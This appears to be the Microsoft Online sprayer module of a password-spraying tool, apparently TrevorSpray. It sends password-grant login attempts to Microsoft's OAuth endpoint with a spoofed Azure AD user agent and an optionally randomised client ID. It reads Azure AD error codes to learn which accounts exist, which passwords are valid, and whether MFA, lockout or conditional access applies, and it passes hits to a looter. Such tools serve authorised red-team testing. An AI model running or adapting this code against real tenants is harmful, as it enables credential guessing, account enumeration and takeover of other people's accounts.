import uuid
import logging
from contextlib import suppress
from .base import BaseSprayModule
from ..looters.msol import MSOLLooter
from ..discover import DomainDiscovery

log = logging.getLogger('trevorspray.sprayers.msol')

class MSOL(BaseSprayModule):

    # default target URL
    default_url = 'https://login.microsoft.com/common/oauth2/token'
    ipv6_url = 'https://prdv6a.aadg.msidentity.com/common/oauth2/token'

    request_data = {
        'resource': 'https://graph.windows.net',
        'client_id': '38aa3b87-a06d-4817-b275-7a316988d93b',
        'client_info': '1',
        'grant_type': 'password',
        'scope': 'openid',
    }

    headers = {
        'Accept': 'application/json',
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Windows-AzureAD-Authentication-Provider/1.0',
    }

    looter = MSOLLooter

    def initialize(self):

        if self.trevor.options.prefer_ipv6 and self.url == self.ipv6_url:
            self.headers['Host'] = 'login.microsoft.com'

        discovery = DomainDiscovery(self.url)
        userrealm = discovery.getuserrealm()
        namespace = userrealm.get('NameSpaceType', 'Unknown')
        if namespace == 'Federated':
            log.warning(f'NameSpaceType for {self.url} is "{namespace}", not "Managed". You may want to try the "adfs" module instead.')

        return True

    def create_request(self, *args, **kwargs):

        request = super().create_request(*args, **kwargs)
        if self.trevor.options.random_useragent:
            request.data['client_id'] = str(uuid.uuid4())
        return request

    def check_response(self, response):

        exists = False
        valid = False
        locked = False
        msg = ''

        if getattr(response, 'status_code', 0) == 200:
            exists = True
            valid = True

        else:
            r = {}
            with suppress(Exception):
                r = response.json()
                exists = True

            error = r.get('error_description', '')
            if error:
                log.debug(error)

            if 'AADSTS50126' in error:
                msg = f'AADSTS50126: Invalid email or password. Account could exist.'

            elif 'AADSTS50128' in error or 'AADSTS50059' in error:
                exists = False
                msg = f'AADSTS50128: Tenant for account doesn\'t exist. Check the domain to make sure they are using Azure/O365 services.'

            elif 'AADSTS90072' in error:
                valid = True
                msg = f'AADSTS90072: Valid credential, but not for this tenant.'

            elif 'AADSTS50034' in error:
                exists = False
                msg = f'AADSTS50034: User does not exist.'

            elif 'AADSTS50079' in error or 'AADSTS50076' in error:
                valid = True
                # Microsoft MFA response
                msg = f'AADSTS50079: The response indicates MFA (Microsoft) is in use.'

            elif 'AADSTS50055' in error:
                valid = True
                # User password is expired
                msg = f'AADSTS50055: The user\'s password is expired.'

            elif 'AADSTS50131' in error:
                valid = True
                # Password is correct but login was blocked
                msg = 'AADSTS50131: Correct password but login was blocked.'

            elif 'AADSTS50158' in error:
                valid = True
                # Conditional Access response (Based off of limited testing this seems to be the response to DUO MFA)
                msg = 'AADSTS50158: The response indicates conditional access (MFA: DUO or other) is in use.'

            elif 'AADSTS50053' in error:
                locked = True
                exists = None # M$ gets nasty and sometimes lies about this
                # Locked out account or Smart Lockout in place
                msg = f'AADSTS50053: Account appears to be locked.'

            elif 'AADSTS50056' in error:
                msg = f'AADSTS50056: Account exists but does not have a password in Azure AD.'

            elif 'AADSTS80014' in error:
                msg = f'AADSTS80014: Account exists, but the maximum Pass-through Authentication time was exceeded.'

            elif 'AADSTS50057' in error:
                # Disabled account
                msg = f'AADSTS50057: The account appears to be disabled.'

            else:
                valid = None
                msg = f'HTTP {response.status_code}: Got an error we haven\'t seen yet: {(r if r else response.text)}'

        return (valid, exists, locked, msg)